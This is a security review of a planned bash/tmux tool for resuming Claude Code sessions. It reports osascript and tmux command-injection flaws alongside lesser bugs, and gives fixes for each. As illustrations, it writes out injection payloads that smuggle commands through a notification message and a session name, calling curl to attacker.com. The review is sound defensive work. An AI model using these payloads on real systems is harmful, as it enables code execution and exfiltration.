# Security Review: Claude Session Resume with tmux Integration

**Reviewer:** Security Sentinel
**Date:** 2026-02-23
**Plan:** `docs/plans/2026-02-23-feat-claude-session-resume-tmux-plan.md`
**Scope:** Shell injection, input validation, untrusted data handling
**Severity Scale:** Critical / High / Medium / Low / Informational

---

## Executive Summary

The plan has **3 High-severity and 2 Medium-severity vulnerabilities**, all stemming from the same root cause: untrusted user input (session names from `/rename`) flows into shell execution contexts without adequate sanitization. The most dangerous path is `osascript -e` with string interpolation from jq output, which allows arbitrary AppleScript execution. The `cs restore` command also has a shell injection path via `tmux new-window ... "claude --resume '<name>'"`.

The plan's `sanitize_tmux_name()` function only sanitizes the **tmux window name**, not the session name passed to `claude --resume` or `osascript`. The hook scripts have no sanitization at all -- they extract JSON fields with jq and interpolate them directly into `osascript -e` strings.

---

## Detailed Findings

### FINDING 1: Shell Injection via osascript in Hook Scripts [HIGH]

**Location:** Plan section "Hook script pattern" (line 123-129)

**Vulnerable code:**

```bash
INPUT=$(cat)
DIR=$(printf '%s' "$INPUT" | jq -r '.cwd // "unknown"' | xargs basename)
MSG=$(printf '%s' "$INPUT" | jq -r '.message // "needs attention"')
osascript -e "display notification \"$DIR: $MSG\" with title \"Claude\" sound name \"Submarine\""
```

**Attack vector:** The `message` field comes from Claude Code's notification system. While `cwd` is a filesystem path (limited character set), the `message` field and the `error` field (in the error hook) can contain arbitrary text. If a message contains a double quote followed by AppleScript commands, it breaks out of the string context:

```
message value: needs attention" & (do shell script "curl attacker.com/$(whoami)")  & "
```

This would produce:

```applescript
display notification "project: needs attention" & (do shell script "curl attacker.com/adamf")  & "" with title "Claude" sound name "Submarine"
```

**Impact:** Arbitrary command execution via AppleScript's `do shell script`. An attacker who can influence the `message` or `error` field in the hook JSON input achieves code execution as the current user.

**Exploitability:** Medium. Requires influencing the notification message content. In the `PostToolUseFailure` hook, the `error` field contains tool error output, which could be influenced by crafted file contents, repository names, or error messages from external services.

**Remediation:**

Option A -- Use heredoc syntax with single-quoted delimiter (prevents shell variable expansion in the AppleScript):

```bash
osascript <<EOF
display notification "$(printf '%s' "$MSG" | sed 's/["\\]/\\&/g')" with title "Claude" sound name "Submarine"
EOF
```

Option B (preferred) -- Escape for AppleScript string context. AppleScript strings use `\"` for literal quotes and `\\` for literal backslashes:

```bash
escape_applescript() {
  local s="$1"
  s="${s//\\/\\\\}"   # escape backslashes first
  s="${s//\"/\\\"}"   # escape double quotes
  printf '%s' "$s"
}

DIR_SAFE=$(escape_applescript "$DIR")
MSG_SAFE=$(escape_applescript "$MSG")
osascript -e "display notification \"${DIR_SAFE}: ${MSG_SAFE}\" with title \"Claude\" sound name \"Submarine\""
```

Option C (most robust) -- Pass data via environment variables and use AppleScript's `system attribute` to read them, avoiding string interpolation entirely:

```bash
NOTIF_BODY="$DIR: $MSG" osascript -e 'display notification (system attribute "NOTIF_BODY") with title "Claude" sound name "Submarine"'
```

This is the strongest option because no user data ever enters the AppleScript source code.

---

### FINDING 2: Shell Injection via tmux new-window Command String [HIGH]

**Location:** Plan section "cs restore" (line 51)

**Vulnerable code:**

```bash
tmux new-window -n "<sanitized-name>" "claude --resume '<name>'"
```

The plan sanitizes the tmux window name (the `-n` argument) but passes the raw session name into the **command string** argument. The command string in `tmux new-window` is executed by `/bin/sh -c`, meaning shell metacharacters in `<name>` will be interpreted.

**Attack vector:** A session named with embedded single quotes breaks out of the quoting:

```
Session name: test'; curl attacker.com/$(whoami); echo '
```

Produces:

```bash
/bin/sh -c "claude --resume 'test'; curl attacker.com/$(whoami); echo ''"
```

**Impact:** Arbitrary command execution when restoring a session.

**Exploitability:** Medium-Low. Requires the user to have previously renamed a session with a malicious name (self-inflicted), or requires an attacker to have write access to the JSONL session files. However, defense-in-depth requires protecting against this -- session files could be synced from untrusted sources, or a compromised Claude session could rename itself.

**Remediation:** Use `tmux send-keys` instead of embedding the command in the `new-window` invocation. The research document's skeleton code already shows this pattern:

```bash
# Safe: create window, then send keys (no shell interpretation of session name)
tmux new-window -t "$TMUX_SESSION" -n "$safe_name"
tmux send-keys -t "$TMUX_SESSION:$safe_name" "claude --resume $(printf '%q' "$session_name")" C-m
```

`printf '%q'` produces a shell-escaped version of the string. Combined with `send-keys` (which sends literal keystrokes, not a shell command), this eliminates the injection vector.

Alternatively, if you must use the command string form, use `printf '%q'` to escape the session name:

```bash
escaped_name=$(printf '%q' "$name")
tmux new-window -n "$safe_name" "claude --resume $escaped_name"
```

---

### FINDING 3: xargs basename Without -- Delimiter [HIGH]

**Location:** Plan section "Hook script pattern" (line 126)

**Vulnerable code:**

```bash
DIR=$(printf '%s' "$INPUT" | jq -r '.cwd // "unknown"' | xargs basename)
```

**Attack vector:** If `cwd` starts with a dash (unlikely for a path but possible via symlink or mount), `basename` interprets it as a flag. More realistically, `xargs` itself is dangerous here -- if the path contains spaces, quotes, or backslashes, `xargs` will interpret them as delimiters/escapes.

For example, a `cwd` of `/Users/adam's project` causes `xargs` to fail or behave unpredictably because of the unmatched single quote.

**Impact:** Script crash (denial of notification) or unexpected basename output.

**Remediation:** Replace with:

```bash
DIR=$(printf '%s' "$INPUT" | jq -r '.cwd // "unknown"' | xargs -0 basename --)
```

Or better, skip `xargs` entirely:

```bash
CWD=$(printf '%s' "$INPUT" | jq -r '.cwd // "unknown"')
DIR=$(basename -- "$CWD")
```

---

### FINDING 4: Incomplete Sanitization Scope in cs restore [MEDIUM]

**Location:** Plan section "cs restore" and "sanitize_tmux_name" (lines 49-54, 113-118)

The plan defines `sanitize_tmux_name()` for the tmux window name but describes no sanitization for:

1. The session name passed to `claude --resume '<name>'`
2. The session name used in any error messages or log output
3. The session name used in the `osascript` notification at the end of the skeleton code (`notify "Session $session_id restored"`)

The `sanitize_tmux_name()` function is correct for its purpose (tmux window names), but the plan implies that sanitized tmux names are the only concern. The raw session name flows through multiple other execution contexts.

**Remediation:** Add a validation step early in `cs restore` that rejects or sanitizes session names for all downstream contexts, not just tmux:

```bash
validate_session_name() {
  local name="$1"
  # Session names from /rename should be human-readable identifiers
  # Reject anything that isn't alphanumeric, spaces, hyphens, underscores, dots
  if [[ ! "$name" =~ ^[a-zA-Z0-9\ _.:-]+$ ]]; then
    die "Session name contains unsafe characters: $(printf '%q' "$name")"
  fi
}
```

This is defense-in-depth. Even if Claude Code itself restricts session name characters, the `cs` tool should not trust that assumption.

---

### FINDING 5: is_interrupt Check Uses Equality on Optional Field [MEDIUM]

**Location:** Plan section "notify-error.sh" description (line 71)

**Described behavior:** "Skip if `is_interrupt` is true"

**Issue:** The research document confirms `is_interrupt` is an **optional boolean** -- it may not be present in the JSON at all. If the implementation does:

```bash
IS_INTERRUPT=$(printf '%s' "$INPUT" | jq -r '.is_interrupt')
if [[ "$IS_INTERRUPT" == "true" ]]; then
  exit 0
fi
```

This works correctly because jq outputs `"null"` for missing fields. However, if the implementation uses jq's `-e` flag or checks for truthiness differently, it could silently skip error notifications or crash.

**Remediation:** Use jq's `// false` default pattern:

```bash
IS_INTERRUPT=$(printf '%s' "$INPUT" | jq -r '.is_interrupt // false')
if [[ "$IS_INTERRUPT" == "true" ]]; then
  exit 0
fi
```

This is defensive and documents the intent clearly.

---

### FINDING 6: Timeout Unit Mismatch [LOW]

**Location:** Plan section "Settings.json additions" (line 143, 149)

**Vulnerable configuration:**

```json
"timeout": 5000
```

**Issue:** The hooks documentation explicitly states timeout is in **seconds**, not milliseconds. `5000` means 5000 seconds (~83 minutes), not 5 seconds. The plan intends a 5-second timeout but specifies 5000.

**Impact:** Hooks would run for up to 83 minutes before timing out, rather than failing fast. This is a functionality bug, not a security vulnerability, but stale hook processes consuming resources for 83 minutes is undesirable.

**Remediation:** Change to `"timeout": 5`.

---

### FINDING 7: encode_path() Produces Ambiguous Encodings [LOW]

**Location:** Plan section "Path encoding" (lines 100-107)

**Code:**

```bash
encode_path() {
  local resolved
  resolved=$(realpath "$1" 2>/dev/null || echo "$1")
  resolved="${resolved%/}"
  echo "$resolved" | tr '/' '-'
}
```

**Issue:** This encoding is not injective. Both `/Users/adam/Work-Strategy` and `/Users/adam/Work/Strategy` would produce `-Users-adam-Work-Strategy`. If two different directories produce the same encoded path, `cs list` would show sessions from the wrong project.

**Impact:** Information leakage across projects -- sessions from one project directory could appear when listing another. Low severity because this is unlikely in practice (directory names with hyphens mapping to the same encoded form as a path separator).

**Remediation:** This mirrors Claude Code's own encoding, so changing it would break compatibility. Document the limitation. If you need to verify, check that the encoded path matches an actual directory under `~/.claude/projects/` rather than trusting the encoding is unique.

---

### FINDING 8: No Input Validation on cs list Project Directory Argument [LOW]

**Location:** Plan section "cs list [project_dir]" (line 30)

**Issue:** The `project_dir` argument is passed to `realpath` and then used to construct a glob path (`~/.claude/projects/<encoded>/*.jsonl`). There is no validation that the resolved path is a real directory or that the encoded form matches an existing projects directory.

**Impact:** Minimal. The worst case is a confusing error message or scanning a nonexistent directory (which grep handles gracefully). No injection risk because the path is only used in a glob, not in a shell execution context.

**Remediation:** Add a check after encoding:

```bash
projects_dir="${HOME}/.claude/projects/$(encode_path "$dir")"
if [[ ! -d "$projects_dir" ]]; then
  printf 'No Claude project data for %s\n' "$dir" >&2
  exit 1
fi
```

---

## Risk Matrix

| # | Finding | Severity | Exploitability | Fix Effort |
|---|---------|----------|----------------|------------|
| 1 | osascript injection in hook scripts | **High** | Medium | Low (add escaping function or use env vars) |
| 2 | Shell injection via tmux new-window command string | **High** | Medium-Low | Low (use send-keys pattern) |
| 3 | xargs basename without delimiter safety | **High** | Low | Trivial (remove xargs, use basename directly) |
| 4 | Incomplete sanitization scope in cs restore | **Medium** | Medium-Low | Low (add validation function) |
| 5 | is_interrupt optional field handling | **Medium** | Low | Trivial (add `// false` default) |
| 6 | Timeout unit mismatch (5000 seconds vs 5) | **Low** | N/A | Trivial (change to 5) |
| 7 | Ambiguous path encoding (non-injective) | **Low** | Very Low | Document only (matches Claude Code behavior) |
| 8 | No validation on project_dir argument | **Low** | Very Low | Trivial (add directory check) |

---

## Remediation Roadmap

### Must Fix Before Implementation (Findings 1, 2, 3)

These three findings allow command injection. They must be addressed in the plan before any code is written.

**1. osascript injection (Finding 1):** Add an `escape_applescript()` helper to the plan, or adopt the environment variable approach (Option C). Apply it in both `notify-attention.sh` and `notify-error.sh`. Update the "Hook script pattern" code block in the plan.

**2. tmux command injection (Finding 2):** Change the `cs restore` design to use the `send-keys` pattern instead of embedding the session name in the `new-window` command string. The research document's skeleton code already uses this pattern -- the plan diverged from it.

**3. xargs safety (Finding 3):** Remove `xargs basename` from the hook script pattern. Replace with direct `basename --` on the jq output variable.

### Should Fix (Findings 4, 5, 6)

**4. Input validation (Finding 4):** Add a `validate_session_name()` function to the plan that rejects names with shell metacharacters. Call it before any use of the raw session name.

**5. Optional field handling (Finding 5):** Specify the `// false` jq default in the plan's hook script pattern.

**6. Timeout units (Finding 6):** Change `5000` to `5` in the settings.json additions.

### Nice to Have (Findings 7, 8)

These are low-risk and can be addressed during implementation or deferred.

---

## Security Requirements Checklist

- [x] `set -uo pipefail` specified (plan line 95)
- [ ] **FAIL: No input sanitization for osascript contexts**
- [ ] **FAIL: No input sanitization for tmux command string contexts**
- [x] Tmux window names sanitized via `sanitize_tmux_name()`
- [x] jq used for JSON parsing (no manual string parsing)
- [ ] **FAIL: xargs used unsafely with potentially adversarial input**
- [x] Notifications treated as optional (2>/dev/null || true in skeleton)
- [x] Errors sent to stderr
- [ ] **FAIL: Timeout units wrong (seconds, not milliseconds)**
- [x] No hardcoded secrets or credentials
- [x] No network access or data exfiltration paths (beyond the injection vectors)
- [x] No eval usage
- [x] Double-quoted variable expansions throughout

---

## Summary

The plan has sound structural decisions (jq for JSON, grep pre-filtering, tmux `has-session`, sanitized window names, strict mode). The research documents are thorough and contain the correct patterns. The vulnerabilities arise from the plan **not consistently applying** the safety patterns from its own research -- specifically, the research doc shows `printf '%q'` and regex validation, but the plan's code blocks omit these for osascript and the tmux command string. Fixing these three injection vectors (Findings 1-3) before implementation is essential.
